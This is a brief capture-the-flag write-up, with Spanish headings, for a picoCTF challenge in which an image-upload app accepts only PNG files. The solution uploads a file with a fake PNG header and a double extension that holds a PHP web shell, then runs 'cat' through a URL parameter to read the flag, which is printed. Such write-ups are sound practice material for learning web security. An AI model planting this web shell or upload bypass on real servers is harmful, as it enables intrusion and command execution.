## Descripción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
Try it [here](http://atlas.picoctf.net:53323/)!
## Pistas

## Solución 1
Subiendo un archivo PNG `adios.png.php`
```php
PNG

<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`

`http://atlas.picoctf.net:53323/uploads/adios.png.php?cmd=cat%20../G4ZTCOJYMJSDS.txt`
## Notas adicionales

## Referencias
